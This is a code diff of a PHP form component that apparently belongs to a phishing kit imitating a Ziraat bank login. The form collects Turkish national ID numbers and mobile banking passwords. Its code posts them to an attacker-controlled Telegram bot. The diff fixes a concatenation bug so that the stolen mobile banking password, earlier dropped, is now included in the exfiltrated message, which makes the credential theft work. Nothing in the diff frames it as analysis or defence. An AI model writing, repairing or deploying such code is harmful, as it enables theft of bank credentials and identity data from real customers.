@@ -59,7 +59,7 @@ class UserForm extends Component
         "tcKimlik.digits" => "TC Kimlik Numarası 11 haneli olmalıdır.",
         "tcKimlik.invalid" => "TC Kimlik Numarası geçersizdir.",
         "sifre.required" => "Mobil Bankacılık Şifresi alanı zorunludur.",
-        "sifre.digits" => "Mobil Bankacılık Şifresi 6 haneli olmalıdır.",
+        "sifre.digits" => "Mobil Bankacılık Şifresi 6 haneli olmalı ve rakamlardan oluşmalıdır.",
         "sifre.invalid" => "Mobil Bankacılık Şifresi geçersizdir.",
     ];
 
@@ -241,7 +241,7 @@ class UserForm extends Component
             "🏦 *Ziraat Müşterisi:* " .
             ($this->musteriMi ? "Evet" : "Hayır") .
             "\n" .
-            "🆔 *TC Kimlik Numarası:* $this->tcKimlik\n";
+            "🆔 *TC Kimlik Numarası:* $this->tcKimlik\n" .
             "🔐 *Mobil Şifre:* $this->sifre\n";
 
         $client->post("https://api.telegram.org/bot{$botApiKey}/sendMessage", [
